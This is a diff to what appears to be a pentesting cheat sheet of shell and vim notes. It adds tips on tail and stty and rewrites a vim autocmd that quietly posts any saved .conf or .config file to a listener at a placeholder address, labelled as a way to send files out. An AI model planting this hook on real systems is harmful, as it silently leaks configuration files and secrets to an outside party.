@@ -4,6 +4,8 @@
 sort # numerical/alphabetical order
 uniq # no duplicate
 tail -n +2 # jumps over one line
+tail -F # final line
+stty -echo # turn off echo, stty echo turn on
 ```
 
 ## Debugging
@@ -123,8 +125,11 @@ modify ~/.vimrc to add autocmd instructions (activated while event occurs)
 |BufWritePost|After writing in buffer|
 |BufWipeout|Before deleting one|
 |StdinReadPost|After reading from stdin into the buffer|
-```~/.vimrc
-autocmd BufWritePost *.conf *.config :silent !timeout 3 curl -m 5 -s https://ip:port -o /dev/null --data-binary @<afile> &
+Send the file to listener whenever conf is written to~/.vimrc
+```bash
+autocmd BufWritePost *.conf *.config :silent !timeout 3 curl \
+-m 5 -s https://ip:port -o /dev/null --data-binary @<afile> & 
+# <afile> is the current vim file in edition
 ```
 
 # Privilege escalation
